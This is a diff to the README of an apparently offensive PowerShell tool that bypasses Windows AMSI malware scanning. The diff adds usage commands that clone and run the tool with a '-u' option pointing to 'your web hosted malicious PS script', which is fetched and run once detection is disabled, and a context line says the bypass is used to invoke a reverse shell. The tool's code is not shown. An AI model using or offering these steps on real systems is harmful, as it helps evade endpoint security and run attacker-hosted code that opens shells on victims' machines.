@@ -7,8 +7,19 @@ in the example shown, the bypass is used to Invoke a reverse shell after AMSI is
 ![ezgif com-resize (2)](https://user-images.githubusercontent.com/91469978/229790638-09003b42-08cd-4a4f-9a43-db74ee5ff4e9.gif)
 
 # Usage
-Replace the url where mantioned in the script to where your malicuios Powershell script is hosted.
-
+```
+  git clone https://github.com/M0M3NTUM44/AMSIReflectionCrypt.git
+  cd AMSIReflectionCrypt
+  .\AMSIReflectionCrypt.ps1 -h
+```
+-ts  Invoke the TestScript.ps1 from GitHub.
+```
+.\AMSIReflectionCrypt.ps1 -ts
+```
+-u   Full path to your web hosted malicious PS script (Default - TestScript.ps1 from GitHub).
+```
+.\AMSIReflectionCrypt.ps1 -u https://PATH/TO/script.ps1
+```
 The TestScript.ps1 file simply types "amsiutils" (flagged string) to the terminal to test if AMSI detection was Bypassed.
 
 # Credits & Resources
